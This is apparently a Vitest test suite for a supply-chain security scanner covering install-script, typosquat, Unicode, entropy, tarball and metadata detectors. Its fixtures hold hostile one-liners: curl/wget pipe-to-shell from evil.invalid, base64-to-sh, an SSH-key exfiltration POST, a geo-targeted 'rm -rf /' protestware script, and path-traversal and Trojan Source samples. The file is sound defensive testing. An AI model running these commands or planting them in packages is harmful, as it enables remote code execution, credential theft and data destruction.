import { describe, it, expect } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import crypto from 'node:crypto';
import { SupplyChainPolicySchema, type SupplyChainPolicy } from '@secureship/contracts';
import { detectInstallScripts } from '../../src/supply-chain/detectors/install-script.detector.js';
import { detectBinConfusion } from '../../src/supply-chain/detectors/bin-confusion.detector.js';
import {
  detectTyposquats,
  PopularListIndex,
} from '../../src/supply-chain/detectors/typosquat.detector.js';
import { detectUnicodeAttacks } from '../../src/supply-chain/detectors/unicode.detector.js';
import { detectHighEntropy } from '../../src/supply-chain/detectors/entropy.detector.js';
import { detectEmptyPackage } from '../../src/supply-chain/detectors/pkg-empty.detector.js';
import { detectMetadataAnomalies } from '../../src/supply-chain/detectors/metadata.detector.js';
import { detectGovernanceRisk } from '../../src/supply-chain/detectors/governance.detector.js';
import { SafeTarExtractor } from '../../src/supply-chain/safe-tar.js';
import { AstCapabilityAnalyzer } from '@secureship/reachability';
import type {
  MetadataProvider,
  Packument,
  PublisherInfo,
  Result,
  ProviderError,
} from '../../src/supply-chain/providers/provider.interface.js';

const DUMMY_POLICY: SupplyChainPolicy = SupplyChainPolicySchema.parse({
  enabled: true,
  typosquat: { minScore: 0.82 },
  entropy: { threshold: 4.5, minLength: 64 },
  obfuscation: { longLine: 1000 },
  semver: { majorJump: 20 },
  hallucination: { minAgeDays: 30 },
  privateScopes: ['@mycompany'],
});

describe('T4 — Detector Edge-Case Sweeps', () => {
  describe('1. Install Scripts Edge Cases', () => {
    it('detects single postinstall script without error and flags as SC-INSTALL-001', () => {
      const pkgJson = {
        name: 'test-postinstall',
        version: '1.0.0',
        scripts: { postinstall: 'node build.js' },
      };
      const hits = detectInstallScripts(pkgJson, os.tmpdir(), DUMMY_POLICY, {
        packageName: 'test-postinstall',
        version: '1.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });

      expect(hits.length).toBe(1);
      expect(hits[0]?.ruleId).toBe('SC-INSTALL-001');
      expect(hits[0]?.severity).toBe('MEDIUM');
      expect(hits[0]?.reachabilityGated).toBe(false);
      expect(hits[0]?.blocking).toBe(false);
    });

    it('detects all three lifecycle scripts: preinstall, install, and postinstall', () => {
      const pkgJson = {
        name: 'test-all-lifecycle',
        version: '1.0.0',
        scripts: {
          preinstall: 'node pre.js',
          install: 'node inst.js',
          postinstall: 'node post.js',
        },
      };
      const hits = detectInstallScripts(pkgJson, os.tmpdir(), DUMMY_POLICY, {
        packageName: 'test-all-lifecycle',
        version: '1.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });

      expect(hits.length).toBe(3);
      const ruleIds = hits.map((h) => h.ruleId);
      expect(ruleIds).toEqual(['SC-INSTALL-001', 'SC-INSTALL-001', 'SC-INSTALL-001']);
    });

    it('ignores empty-string scripts or whitespace-only scripts', () => {
      const pkgJson = {
        name: 'test-empty-scripts',
        version: '1.0.0',
        scripts: {
          preinstall: '',
          install: '   ',
          postinstall: '\t\n',
        },
      };
      const hits = detectInstallScripts(pkgJson, os.tmpdir(), DUMMY_POLICY, {
        packageName: 'test-empty-scripts',
        version: '1.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });

      expect(hits.length).toBe(0);
    });

    it('does not treat non-lifecycle script casing as lifecycle hooks (e.g. PostInstall)', () => {
      const pkgJson = {
        name: 'test-casing',
        version: '1.0.0',
        scripts: {
          PostInstall: 'node evil.js',
          PREINSTALL: 'node evil.js',
        },
      };
      const hits = detectInstallScripts(pkgJson, os.tmpdir(), DUMMY_POLICY, {
        packageName: 'test-casing',
        version: '1.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });

      expect(hits.length).toBe(0);
    });

    it('handles non-string script values gracefully without crashing', () => {
      const pkgJson = {
        name: 'test-non-string',
        version: '1.0.0',
        scripts: {
          postinstall: 12345,
          preinstall: { command: 'node evil.js' },
          install: null,
        },
      };
      const hits = detectInstallScripts(pkgJson, os.tmpdir(), DUMMY_POLICY, {
        packageName: 'test-non-string',
        version: '1.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });

      expect(hits.length).toBe(0);
    });

    it('handles null or missing scripts object gracefully', () => {
      const pkgJson = {
        name: 'test-no-scripts',
        version: '1.0.0',
      };
      const hits = detectInstallScripts(pkgJson, os.tmpdir(), DUMMY_POLICY, {
        packageName: 'test-no-scripts',
        version: '1.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });

      expect(hits.length).toBe(0);
    });

    it('flags dangerous fetch-and-execute remote shell execution as SC-INSTALL-003 CRITICAL', () => {
      const cases = [
        'curl -sSL https://evil.invalid/pwn.sh | bash',
        'wget -qO- https://evil.invalid/run | sh',
        'bash -c "curl https://evil.invalid | python"',
      ];

      for (const cmd of cases) {
        const pkgJson = {
          name: 'test-dangerous-fetch',
          version: '1.0.0',
          scripts: { postinstall: cmd },
        };
        const hits = detectInstallScripts(pkgJson, os.tmpdir(), DUMMY_POLICY, {
          packageName: 'test-dangerous-fetch',
          version: '1.0.0',
          ecosystem: 'npm',
          packageDir: os.tmpdir(),
          now: () => new Date('2026-01-01T00:00:00Z'),
        });

        expect(hits.length).toBe(1);
        expect(hits[0]?.ruleId).toBe('SC-INSTALL-003');
        expect(hits[0]?.severity).toBe('CRITICAL');
        expect(hits[0]?.blocking).toBe(true);
      }
    });

    it('flags base64 decoding execution as SC-INSTALL-003 CRITICAL', () => {
      const pkgJson = {
        name: 'test-b64-decode',
        version: '1.0.0',
        scripts: { preinstall: 'echo aGVsbG8= | base64 -d | sh' },
      };
      const hits = detectInstallScripts(pkgJson, os.tmpdir(), DUMMY_POLICY, {
        packageName: 'test-b64-decode',
        version: '1.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });

      expect(hits.length).toBe(1);
      expect(hits[0]?.ruleId).toBe('SC-INSTALL-003');
      expect(hits[0]?.severity).toBe('CRITICAL');
      expect(hits[0]?.blocking).toBe(true);
    });

    it('flags credential exfiltration pattern as SC-INSTALL-003 CRITICAL', () => {
      const pkgJson = {
        name: 'test-exfil',
        version: '1.0.0',
        scripts: { postinstall: 'curl -X POST https://evil.invalid -d @~/.ssh/id_rsa' },
      };
      const hits = detectInstallScripts(pkgJson, os.tmpdir(), DUMMY_POLICY, {
        packageName: 'test-exfil',
        version: '1.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });

      expect(hits.length).toBe(1);
      expect(hits[0]?.ruleId).toBe('SC-INSTALL-003');
      expect(hits[0]?.severity).toBe('CRITICAL');
      expect(hits[0]?.blocking).toBe(true);
    });

    it('exempts exact allowlisted "node-gyp rebuild" but flags "node-gyp rebuild && curl ..."', () => {
      const safePkg = {
        name: 'test-node-gyp-safe',
        version: '1.0.0',
        scripts: { install: 'node-gyp rebuild' },
      };
      const safeHits = detectInstallScripts(safePkg, os.tmpdir(), DUMMY_POLICY, {
        packageName: 'test-node-gyp-safe',
        version: '1.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });
      expect(safeHits.length).toBe(0);

      const chainedPkg = {
        name: 'test-node-gyp-chained',
        version: '1.0.0',
        scripts: { install: 'node-gyp rebuild && curl https://evil.invalid | sh' },
      };
      const chainedHits = detectInstallScripts(chainedPkg, os.tmpdir(), DUMMY_POLICY, {
        packageName: 'test-node-gyp-chained',
        version: '1.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });
      expect(chainedHits.length).toBe(1);
      expect(chainedHits[0]?.ruleId).toBe('SC-INSTALL-003');
    });
  });

  describe('2. Bin Shadowing & Path Traversal Edge Cases', () => {
    it('handles string bin field correctly extracting binary name', () => {
      const pkgJson = {
        name: 'my-cli-tool',
        version: '1.0.0',
        bin: './bin/cli.js',
      };
      const hits = detectBinConfusion(pkgJson, DUMMY_POLICY, {
        packageName: 'my-cli-tool',
        version: '1.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });

      expect(hits.length).toBe(0);
    });

    it('flags system command shadowing when bin is string named after system command', () => {
      const pkgJson = {
        name: 'curl',
        version: '1.0.0',
        bin: './bin/curl.js',
      };
      const hits = detectBinConfusion(pkgJson, DUMMY_POLICY, {
        packageName: 'curl',
        version: '1.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });

      expect(hits.length).toBe(1);
      expect(hits[0]?.ruleId).toBe('SC-BIN-002');
      expect(hits[0]?.severity).toBe('HIGH');
    });

    it('flags map bin shadowing system commands: git, bash, powershell, sudo, tar', () => {
      const pkgJson = {
        name: 'innocent-pkg',
        version: '1.0.0',
        bin: {
          git: './bin/git.js',
          BASH: './bin/bash.js',
          powershell: './bin/ps.js',
          sudo: './bin/sudo.js',
          tar: './bin/tar.js',
        },
      };
      const hits = detectBinConfusion(pkgJson, DUMMY_POLICY, {
        packageName: 'innocent-pkg',
        version: '1.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });

      const binHits = hits.filter((h) => h.ruleId === 'SC-BIN-002');
      expect(binHits.length).toBe(5);
    });

    it('flags bin path traversal escaping package root: relative ../, /absolute, backslashes', () => {
      const pkgJson = {
        name: 'traversal-bin',
        version: '1.0.0',
        bin: {
          escape1: '../../etc/passwd',
          escape2: '/usr/local/bin/run',
          escape3: '..\\..\\windows\\system32\\cmd.exe',
        },
      };
      const hits = detectBinConfusion(pkgJson, DUMMY_POLICY, {
        packageName: 'traversal-bin',
        version: '1.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });

      const slipHits = hits.filter((h) => h.ruleId === 'SC-BIN-001');
      expect(slipHits.length).toBe(3);
      expect(slipHits[0]?.blocking).toBe(true);
      expect(slipHits[0]?.severity).toBe('HIGH');
    });

    it('handles empty or non-string bin gracefully', () => {
      const pkgJson = {
        name: 'empty-bin',
        version: '1.0.0',
        bin: null,
      };
      const hits = detectBinConfusion(pkgJson as Record<string, unknown>, DUMMY_POLICY, {
        packageName: 'empty-bin',
        version: '1.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });

      expect(hits.length).toBe(0);
    });
  });

  describe('3. Typosquat Family Edge Cases', () => {
    const popularEntries = [
      { name: 'express' },
      { name: 'lodash' },
      { name: 'chalk' },
      { name: 'react' },
      { name: 'socket.io' },
      { name: 'cross-env' },
      { name: 'typescript' },
    ];
    const index = new PopularListIndex(popularEntries);

    it('does NOT flag candidates that are themselves in the popular list', async () => {
      const hits = await detectTyposquats('express', 'npm', index, DUMMY_POLICY);
      expect(hits.length).toBe(0);
    });

    it('flags edit distance squats with D=1 or D=2 and similarity >= 0.82', async () => {
      // "expres" is deletion from "express" (len 7, dist 1, score = 1 - 1/7 = 0.857 >= 0.82)
      const hits = await detectTyposquats('expres', 'npm', index, DUMMY_POLICY);
      expect(hits.length).toBeGreaterThanOrEqual(1);
      const squat = hits.find((h) => h.ruleId === 'SC-TYPO-001');
      expect(squat).toBeDefined();
      expect(squat?.severity).toBe('HIGH');
    });

    it('flags combosquat suffix and prefix inflation (SC-TYPO-002)', async () => {
      const suffixHits = await detectTyposquats('express-js', 'npm', index, DUMMY_POLICY);
      const suffixHit = suffixHits.find((h) => h.ruleId === 'SC-TYPO-002');
      expect(suffixHit).toBeDefined();
      expect(suffixHit?.severity).toBe('MEDIUM');

      const prefixHits = await detectTyposquats('node-lodash', 'npm', index, DUMMY_POLICY);
      const prefixHit = prefixHits.find((h) => h.ruleId === 'SC-TYPO-002');
      expect(prefixHit).toBeDefined();
      expect(prefixHit?.severity).toBe('MEDIUM');
    });

    it('flags scope confusion when a scoped package mirrors an unscoped popular package', async () => {
      const hits = await detectTyposquats('@evil/express', 'npm', index, DUMMY_POLICY);
      const scopeHit = hits.find((h) => h.ruleId === 'SC-TYPO-002');
      expect(scopeHit).toBeDefined();
      expect(scopeHit?.description).toContain('Scope confusion');
    });

    it('flags separator collapse squatting (SC-TYPO-003)', async () => {
      // "crossenv" collapses "cross-env"
      const hits1 = await detectTyposquats('crossenv', 'npm', index, DUMMY_POLICY);
      const collapseHit1 = hits1.find((h) => h.ruleId === 'SC-TYPO-003');
      expect(collapseHit1).toBeDefined();
      expect(collapseHit1?.severity).toBe('MEDIUM');

      // "socketio" collapses "socket.io"
      const hits2 = await detectTyposquats('socketio', 'npm', index, DUMMY_POLICY);
      const collapseHit2 = hits2.find((h) => h.ruleId === 'SC-TYPO-003');
      expect(collapseHit2).toBeDefined();
      expect(collapseHit2?.severity).toBe('MEDIUM');
    });
  });

  describe('4. Unicode & Trojan Source Edge Cases', () => {
    it('detects Bidi control characters and reports SC-UNI-001 CRITICAL with blocking=true', () => {
      const content = `const accessLevel = "user";\n// \u202E } \u2066 if (accessLevel === "admin") { \u2069 \u2066`;
      const hits = detectUnicodeAttacks(content, 'auth.js', DUMMY_POLICY);

      expect(hits.length).toBe(1);
      expect(hits[0]?.ruleId).toBe('SC-UNI-001');
      expect(hits[0]?.severity).toBe('CRITICAL');
      expect(hits[0]?.blocking).toBe(true);
      expect(hits[0]?.evidence[0]?.note).toContain('U+202E');
    });

    it('permits UTF-8 BOM U+FEFF at line 1 column 1, but flags non-BOM zero-width characters as SC-UNI-002', () => {
      // BOM at start
      const bomContent = '\uFEFFconst x = 1;';
      const safeHits = detectUnicodeAttacks(bomContent, 'index.js', DUMMY_POLICY);
      expect(safeHits.length).toBe(0);

      // Zero-width space inside identifier/code
      const evilContent = 'const x\u200By = 1;';
      const evilHits = detectUnicodeAttacks(evilContent, 'index.js', DUMMY_POLICY);
      expect(evilHits.length).toBe(1);
      expect(evilHits[0]?.ruleId).toBe('SC-UNI-002');
      expect(evilHits[0]?.severity).toBe('HIGH');
    });

    it('detects mixed-script homoglyphs in identifiers (SC-UNI-003)', () => {
      // Cyrillic small letter 'а' (U+0430) inside "pаckage"
      const content = 'const p\u0430ckage = "hello";';
      const hits = detectUnicodeAttacks(content, 'test.js', DUMMY_POLICY);

      expect(hits.length).toBe(1);
      expect(hits[0]?.ruleId).toBe('SC-UNI-003');
      expect(hits[0]?.severity).toBe('HIGH');
      expect(hits[0]?.evidence[0]?.note).toContain('U+0430');
    });

    it('reports exact 1-based line and column positions in evidence', () => {
      const content = 'line 1\nline 2\nconst bad = "\u202E";';
      const hits = detectUnicodeAttacks(content, 'test.js', DUMMY_POLICY);

      expect(hits[0]?.evidence[0]?.startLine).toBe(3);
      expect(hits[0]?.evidence[0]?.startCol).toBe(14);
    });
  });

  describe('5. Entropy & Obfuscation Edge Cases', () => {
    it('flags high Shannon entropy strings (H >= 4.5 and len >= 64) as SC-OBF-001', () => {
      // Generate random base64 string with high entropy
      const highEntropyStr = crypto.randomBytes(96).toString('base64');
      const content = `const payload = "${highEntropyStr}";`;
      const hits = detectHighEntropy(content, 'payload.js', DUMMY_POLICY);

      expect(hits.length).toBe(1);
      expect(hits[0]?.ruleId).toBe('SC-OBF-001');
      expect(hits[0]?.severity).toBe('HIGH');
    });

    it('ignores excluded literals: SRI hashes, Data URIs, UUIDs, and licenses', () => {
      const exclusions = [
        'const sri = "sha512-47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=";',
        'const icon = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=";',
        'const id = "123e4567-e89b-12d3-a456-426614174000";',
        '/* Apache-2.0 Copyright (c) 2026 SecureShip Team All Rights Reserved */',
      ];

      for (const snippet of exclusions) {
        const hits = detectHighEntropy(snippet, 'lib.js', DUMMY_POLICY);
        expect(hits.length).toBe(0);
      }
    });

    it('flags massive unbroken single line exceeding 1000 chars as SC-OBF-002', () => {
      const longPackedLine = 'var _0x12ab=' + 'a'.repeat(1200) + ';';
      const hits = detectHighEntropy(longPackedLine, 'packed.js', DUMMY_POLICY);

      const obfHit = hits.find((h) => h.ruleId === 'SC-OBF-002');
      expect(obfHit).toBeDefined();
      expect(obfHit?.severity).toBe('MEDIUM');
    });
  });

  describe('6. Empty Package Edge Cases', () => {
    it('flags package with 0 executable code files as SC-PKG-001', () => {
      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-empty-'));
      try {
        fs.writeFileSync(
          path.join(tempDir, 'package.json'),
          JSON.stringify({ name: 'empty-test', version: '1.0.0' })
        );
        fs.writeFileSync(path.join(tempDir, 'README.md'), '# Empty Package\n');
        fs.writeFileSync(path.join(tempDir, 'LICENSE'), 'MIT License\n');

        const hits = detectEmptyPackage(
          tempDir,
          {},
          {
            packageName: 'empty-test',
            version: '1.0.0',
            ecosystem: 'npm',
            packageDir: tempDir,
            now: () => new Date('2026-01-01T00:00:00Z'),
          }
        );

        expect(hits.length).toBe(1);
        expect(hits[0]?.ruleId).toBe('SC-PKG-001');
        expect(hits[0]?.severity).toBe('MEDIUM');
      } finally {
        fs.rmSync(tempDir, { recursive: true, force: true });
      }
    });

    it('does not flag package when at least one code file exists', () => {
      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-code-'));
      try {
        fs.writeFileSync(
          path.join(tempDir, 'package.json'),
          JSON.stringify({ name: 'code-test', version: '1.0.0' })
        );
        fs.writeFileSync(path.join(tempDir, 'index.js'), 'module.exports = { run: () => 42 };');

        const hits = detectEmptyPackage(
          tempDir,
          {},
          {
            packageName: 'code-test',
            version: '1.0.0',
            ecosystem: 'npm',
            packageDir: tempDir,
            now: () => new Date('2026-01-01T00:00:00Z'),
          }
        );

        expect(hits.length).toBe(0);
      } finally {
        fs.rmSync(tempDir, { recursive: true, force: true });
      }
    });
  });

  describe('7. Safe Tarball Security Guards', () => {
    it('verifies SRI integrity against sha512 hash independently', () => {
      const content = new TextEncoder().encode('package tarball content');
      const expectedSha512 = crypto.createHash('sha512').update(content).digest('base64');
      const validSri = `sha512-${expectedSha512}`;
      const invalidSri = `sha512-ZmFrZWhhc2g=`;

      expect(SafeTarExtractor.verifySri(content, validSri)).toBe(true);
      expect(SafeTarExtractor.verifySri(content, invalidSri)).toBe(false);
    });

    it('rejects path traversal entry in tarball header', () => {
      // Construct a minimal 512-byte tar header with traversal path "../../evil.txt"
      const header = new Uint8Array(1024); // 512 header + 512 empty block
      const filename = '../../evil.txt';
      for (let i = 0; i < filename.length; i++) {
        header[i] = filename.charCodeAt(i);
      }
      // Set file size to 0 octal
      const sizeStr = '00000000000 ';
      for (let i = 0; i < sizeStr.length; i++) {
        header[124 + i] = sizeStr.charCodeAt(i);
      }

      const res = SafeTarExtractor.extract(header);
      expect(res.ok).toBe(true);
      expect(res.files.length).toBe(0);
      expect(res.diagnostics.some((d) => d.includes('Rejected path traversal'))).toBe(true);
    });
  });

  describe('8. AST Capabilities Edge Cases', () => {
    it('detects child process execution capability via require and destructuring', async () => {
      const code = `
        const { exec } = require('child_process');
        exec('whoami');
      `;
      const res = await AstCapabilityAnalyzer.analyzeFile(code, 'runner.js');
      expect(res.capabilities.hasShell).toBe(true);
      expect(res.sites.some((s) => s.capability === 'shell')).toBe(true);
    });

    it('detects node: protocol imports (node:child_process, node:fs, node:http)', async () => {
      const code = `
        import { spawn } from 'node:child_process';
        spawn('ls', ['-la']);
      `;
      const res = await AstCapabilityAnalyzer.analyzeFile(code, 'node-prefix.js');
      expect(res.capabilities.hasShell).toBe(true);
    });

    it('detects sensitive filesystem targets (~/.ssh, ~/.aws, /etc/passwd)', async () => {
      const code = `
        const fs = require('fs');
        const path = require('path');
        fs.readFileSync('/etc/passwd');
      `;
      const res = await AstCapabilityAnalyzer.analyzeFile(code, 'exfil.js');
      expect(res.capabilities.hasFsSensitive).toBe(true);
      expect(res.sites.some((s) => s.capability === 'fsSensitive')).toBe(true);
    });

    it('detects ambient environment variable access (process.env)', async () => {
      const code = `
        const token = process.env.NPM_TOKEN;
      `;
      const res = await AstCapabilityAnalyzer.analyzeFile(code, 'env.js');
      expect(res.capabilities.hasEnvAccess).toBe(true);
      expect(res.sites.some((s) => s.capability === 'env')).toBe(true);
    });
  });

  describe('9. Metadata Anomalies Edge Cases', () => {
    class StubMetadataProvider implements MetadataProvider {
      constructor(
        private packument: Packument,
        private publisher: PublisherInfo | null = null,
        private downloads = 1000
      ) {}

      async getPackument(): Promise<Result<Packument, ProviderError>> {
        return { ok: true, value: this.packument };
      }

      async getWeeklyDownloads(): Promise<Result<number, ProviderError>> {
        return { ok: true, value: this.downloads };
      }

      async getPublisher(): Promise<Result<PublisherInfo | null, ProviderError>> {
        return { ok: true, value: this.publisher };
      }

      async getTarball(): Promise<Result<Uint8Array, ProviderError>> {
        return { ok: true, value: new Uint8Array(0) };
      }
    }

    it('detects future publish date as chronological release anomaly (SC-META-001)', async () => {
      const now = new Date('2026-01-01T00:00:00Z');
      const packument: Packument = {
        name: 'future-pkg',
        versions: { '1.0.0': { name: 'future-pkg', version: '1.0.0' } },
        time: { '1.0.0': '2028-12-31T00:00:00Z' }, // Far future
        maintainers: [{ name: 'alice' }],
      };
      const provider = new StubMetadataProvider(packument);
      const hits = await detectMetadataAnomalies(
        'future-pkg',
        '1.0.0',
        {},
        provider,
        DUMMY_POLICY,
        {
          packageName: 'future-pkg',
          version: '1.0.0',
          ecosystem: 'npm',
          packageDir: os.tmpdir(),
          now: () => now,
        }
      );

      expect(hits.length).toBe(1);
      expect(hits[0]?.ruleId).toBe('SC-META-001');
      expect(hits[0]?.severity).toBe('MEDIUM');
      expect(hits[0]?.blocking).toBe(false);
    });

    it('flags private scope package published on public registry as SC-META-002 blocking', async () => {
      const packument: Packument = {
        name: '@mycompany/internal-tool',
        versions: { '1.0.0': { name: '@mycompany/internal-tool', version: '1.0.0' } },
        time: { '1.0.0': '2025-01-01T00:00:00Z' },
        maintainers: [{ name: 'attacker' }],
      };
      const provider = new StubMetadataProvider(packument);
      const hits = await detectMetadataAnomalies(
        '@mycompany/internal-tool',
        '1.0.0',
        {},
        provider,
        DUMMY_POLICY,
        {
          packageName: '@mycompany/internal-tool',
          version: '1.0.0',
          ecosystem: 'npm',
          packageDir: os.tmpdir(),
          now: () => new Date('2026-01-01T00:00:00Z'),
        }
      );

      const confusionHit = hits.find((h) => h.ruleId === 'SC-META-002');
      expect(confusionHit).toBeDefined();
      expect(confusionHit?.severity).toBe('HIGH');
      expect(confusionHit?.blocking).toBe(true);
    });

    it('flags massive SemVer jump >= 20 as SC-META-002 blocking', async () => {
      const packument: Packument = {
        name: 'jump-pkg',
        versions: {
          '1.0.0': { name: 'jump-pkg', version: '1.0.0' },
          '99.0.0': { name: 'jump-pkg', version: '99.0.0' },
        },
        time: { '99.0.0': '2026-01-01T00:00:00Z' },
        maintainers: [{ name: 'bob' }],
      };
      const provider = new StubMetadataProvider(packument);
      const hits = await detectMetadataAnomalies('jump-pkg', '99.0.0', {}, provider, DUMMY_POLICY, {
        packageName: 'jump-pkg',
        version: '99.0.0',
        ecosystem: 'npm',
        packageDir: os.tmpdir(),
        now: () => new Date('2026-01-01T00:00:00Z'),
      });

      const jumpHit = hits.find((h) => h.ruleId === 'SC-META-002');
      expect(jumpHit).toBeDefined();
      expect(jumpHit?.severity).toBe('HIGH');
      expect(jumpHit?.blocking).toBe(true);
    });

    it('flags hidden install script injected into local package as SC-META-003 blocking', async () => {
      const packument: Packument = {
        name: 'desync-pkg',
        versions: {
          '1.0.0': {
            name: 'desync-pkg',
            version: '1.0.0',
            scripts: { test: 'vitest run' }, // No install script in registry
          },
        },
        time: { '1.0.0': '2026-01-01T00:00:00Z' },
        maintainers: [{ name: 'charlie' }],
      };
      const provider = new StubMetadataProvider(packument);
      // Local package.json has injected postinstall
      const localPkgJson = {
        scripts: {
          postinstall: 'node hidden-backdoor.js',
        },
      };
      const hits = await detectMetadataAnomalies(
        'desync-pkg',
        '1.0.0',
        localPkgJson,
        provider,
        DUMMY_POLICY,
        {
          packageName: 'desync-pkg',
          version: '1.0.0',
          ecosystem: 'npm',
          packageDir: os.tmpdir(),
          now: () => new Date('2026-01-01T00:00:00Z'),
        }
      );

      const desyncHit = hits.find((h) => h.ruleId === 'SC-META-003');
      expect(desyncHit).toBeDefined();
      expect(desyncHit?.severity).toBe('HIGH');
      expect(desyncHit?.blocking).toBe(true);
    });
  });

  describe('10. Governance & Maintainer Risk Edge Cases', () => {
    class StubGovProvider implements MetadataProvider {
      constructor(private publisher: PublisherInfo | null) {}
      async getPackument(): Promise<Result<Packument, ProviderError>> {
        return { ok: true, value: { name: 'test', versions: {}, time: {}, maintainers: [] } };
      }
      async getWeeklyDownloads(): Promise<Result<number, ProviderError>> {
        return { ok: true, value: 500 };
      }
      async getPublisher(): Promise<Result<PublisherInfo | null, ProviderError>> {
        return { ok: true, value: this.publisher };
      }
      async getTarball(): Promise<Result<Uint8Array, ProviderError>> {
        return { ok: true, value: new Uint8Array(0) };
      }
    }

    it('detects protestware geo-targeting combined with destructive deletion as SC-GOV-003 blocking', async () => {
      const pkgJson = {
        name: 'protestware-pkg',
        scripts: {
          postinstall:
            "node -e \"if (process.env.LANG === 'ru') { require('child_process').execSync('rm -rf /'); }\"",
        },
      };
      const provider = new StubGovProvider({ username: 'dev', verified: true });
      const hits = await detectGovernanceRisk(
        'protestware-pkg',
        '1.0.0',
        pkgJson,
        provider,
        DUMMY_POLICY,
        {
          packageName: 'protestware-pkg',
          version: '1.0.0',
          ecosystem: 'npm',
          packageDir: os.tmpdir(),
          now: () => new Date('2026-01-01T00:00:00Z'),
        }
      );

      const protestHit = hits.find((h) => h.ruleId === 'SC-GOV-003');
      expect(protestHit).toBeDefined();
      expect(protestHit?.severity).toBe('CRITICAL');
      expect(protestHit?.blocking).toBe(true);
    });

    it('flags unverified or missing publisher account as SC-GOV-002', async () => {
      const pkgJson = { name: 'missing-pub-pkg' };
      const provider = new StubGovProvider(null);
      const hits = await detectGovernanceRisk(
        'missing-pub-pkg',
        '1.0.0',
        pkgJson,
        provider,
        DUMMY_POLICY,
        {
          packageName: 'missing-pub-pkg',
          version: '1.0.0',
          ecosystem: 'npm',
          packageDir: os.tmpdir(),
          now: () => new Date('2026-01-01T00:00:00Z'),
        }
      );

      const pubHit = hits.find((h) => h.ruleId === 'SC-GOV-002');
      expect(pubHit).toBeDefined();
      expect(pubHit?.severity).toBe('MEDIUM');
      expect(pubHit?.blocking).toBe(false);
    });
  });

  describe('11. AI Hallucination Target Edge Cases', () => {
    class StubHallucinationProvider implements MetadataProvider {
      constructor(
        private packument: Packument,
        private downloads = 0
      ) {}
      async getPackument(): Promise<Result<Packument, ProviderError>> {
        return { ok: true, value: this.packument };
      }
      async getWeeklyDownloads(): Promise<Result<number, ProviderError>> {
        return { ok: true, value: this.downloads };
      }
      async getPublisher(): Promise<Result<PublisherInfo | null, ProviderError>> {
        return { ok: true, value: { username: 'hallucinated-author' } };
      }
      async getTarball(): Promise<Result<Uint8Array, ProviderError>> {
        return { ok: true, value: new Uint8Array(0) };
      }
    }

    it('flags young package with <= 2 versions and < 50 downloads as SC-HALL-001', async () => {
      const now = new Date('2026-01-15T00:00:00Z');
      const packument: Packument = {
        name: 'hallucinated-ai-lib',
        versions: { '1.0.0': { name: 'hallucinated-ai-lib', version: '1.0.0' } },
        time: {
          created: '2026-01-10T00:00:00Z', // 5 days old (< 30 days)
          '1.0.0': '2026-01-10T00:00:00Z',
        },
        maintainers: [{ name: 'newbie' }],
      };
      const provider = new StubHallucinationProvider(packument, 10);
      const emptyIndex = new PopularListIndex([]);

      const hits = await detectTyposquats(
        'hallucinated-ai-lib',
        'npm',
        emptyIndex,
        DUMMY_POLICY,
        provider,
        {
          packageName: 'hallucinated-ai-lib',
          version: '1.0.0',
          ecosystem: 'npm',
          packageDir: os.tmpdir(),
          now: () => now,
        }
      );

      const hallHit = hits.find((h) => h.ruleId === 'SC-HALL-001');
      expect(hallHit).toBeDefined();
      expect(hallHit?.severity).toBe('HIGH');
      expect(hallHit?.blocking).toBe(false);
      expect(hallHit?.evidence[0]?.note).toContain('AI hallucination risk');
    });
  });
});
